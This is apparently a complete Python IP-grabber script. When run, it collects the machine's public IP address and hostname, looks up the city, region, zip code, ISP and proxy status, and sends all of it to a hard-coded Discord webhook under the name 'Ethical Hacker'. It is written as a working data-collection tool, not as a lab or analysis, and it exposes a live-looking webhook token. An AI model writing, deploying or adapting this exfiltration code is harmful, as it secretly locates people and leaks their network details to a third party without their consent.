import socket
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

# CONFIG
webhook_url = "https://discord.com/api/webhooks/1137315612075491348/ilbWLOeESHG7P-6XiPY8V3-iYsffL_CyYWGuMCkz8LQ_41FSFFkdvYJ-vJMFJ88feGnj"
webhook_name = "Ethical Hacker"
webhook_a_url = "https://raw.githubusercontent.com/Enderkries2011/private-stuff/main/141019770.jpeg"

def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        data = response.json()
        return data['ip']
    except requests.RequestException:
        return "Failed to get public IP"

def get_location(ip_address):
    try:
        url = f"http://ip-api.com/json/{ip_address}?fields=11665983"
        response = requests.get(url)
        data = response.json()
        return data
    except requests.RequestException:
        return None

public_ip_address = get_public_ip()

content = "Data Successfully Collected From: " + socket.gethostname()
webhook = DiscordWebhook(url=webhook_url, username=webhook_name, avatar_url=webhook_a_url, content=content)

location_data = get_location(public_ip_address)

if location_data:
    embed = DiscordEmbed(title="Info", color=121583)

    embed.add_embed_field(name="IP:", value=public_ip_address)
    embed.add_embed_field(name="Host:", value=socket.gethostname())
    embed.add_embed_field(name="City:", value=location_data.get("city", "Unknown"))
    embed.add_embed_field(name="Region:", value=location_data.get("regionName", "Unknown"))
    embed.add_embed_field(name="Country:", value=location_data.get("country", "Unknown"))
    embed.add_embed_field(name="Country Code:", value=location_data.get("countryCode", "Unknown"))
    embed.add_embed_field(name="Continent:", value=location_data.get("continent", "Unknown"))
    embed.add_embed_field(name="Continent Code:", value=location_data.get("continentCode", "Unknown"))
    embed.add_embed_field(name="Zip Code:", value=location_data.get("zip", "Unknown"))
    embed.add_embed_field(name="ISP:", value=location_data.get("isp", "Unknown"))
    embed.add_embed_field(name="Proxy/Vpn:", value=location_data.get("proxy", "Unknown"))
    embed.add_embed_field(name="Currency:", value=location_data.get("currency", "Unknown"))

    webhook.add_embed(embed)
else:
    webhook.content = "Failed to fetch geolocation data."

response = webhook.execute()